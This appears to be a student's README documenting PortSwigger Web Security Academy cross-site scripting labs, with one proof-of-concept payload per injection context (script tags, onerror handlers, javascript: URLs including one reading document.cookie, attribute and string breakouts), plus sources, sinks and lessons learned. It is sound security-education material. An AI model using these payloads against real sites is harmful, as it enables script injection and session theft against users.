# Cross-Site Scripting (XSS) Labs

This repository documents my practical work with Cross-Site Scripting (XSS) vulnerabilities using PortSwigger Web Security Academy labs.

The project focuses on understanding how XSS vulnerabilities occur in different application contexts, how user-controlled input reaches vulnerable sinks, and how different payloads can be used to demonstrate JavaScript execution.

## Overview

The labs cover:

- Reflected XSS
- Stored XSS
- DOM-based XSS
- HTML injection
- HTML attribute injection
- JavaScript string injection
- DOM manipulation
- jQuery-based XSS
- Event handler injection

### HTML Context

```html
<script>alert(1)</script>
```

### Stored HTML XSS

```html
<script>alert(1)</script>
```

### DOM XSS with `document.write`

```html
"><svg onload=alert(1)>
```

### DOM XSS with `innerHTML`

```html
<img src=1 onerror=alert(1)>
```

### jQuery `href` Attribute

```javascript
javascript:alert(document.cookie)
```

### jQuery Selector with Hashchange

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

### Reflected XSS in HTML Attribute

```html
"onmouseover="alert(1)
```

### Stored XSS in `href` Attribute

```javascript
javascript:alert(1)
```

### Reflected XSS in JavaScript String

```javascript
'-alert(1)-'
```

### DOM XSS Inside a Select Element

```text
product?productId=1&storeId="></select><img%20src=1%20onerror=
```

## Sources

Common attacker-controlled sources explored include:

```text
location.search
location.hash
User input
URL parameters
Stored application data
```

## Sinks

Potentially vulnerable sinks explored include:

```text
document.write
innerHTML
jQuery $()
jQuery href modification
HTML attributes
JavaScript strings
Event handlers
```

## What This Demonstrates

These exercises demonstrate that XSS exploitation depends on the context in which user-controlled data is inserted.

The same payload does not necessarily work in every situation. The payload must be adapted to the specific HTML, JavaScript, attribute, or DOM context.

The project demonstrates the importance of identifying:

- Where attacker-controlled data originates
- Where the data is reflected or stored
- How the application processes the data
- Which sink receives the data
- Whether input is encoded or sanitized
- How the existing context can be escaped

## Tools Used

- Burp Suite
- Browser Developer Tools
- PortSwigger Web Security Academy
- HTML
- JavaScript
- jQuery

## Learning Outcomes

Through these labs, I practiced identifying XSS vulnerabilities, analyzing application behavior, identifying sources and sinks, inspecting HTML and JavaScript, testing payloads, and understanding how different encoding mechanisms affect XSS execution.

The main takeaway is that understanding the injection context is essential when analyzing XSS vulnerabilities.

## Disclaimer

All testing documented in this repository was performed in authorized PortSwigger Web Security Academy labs for educational purposes.
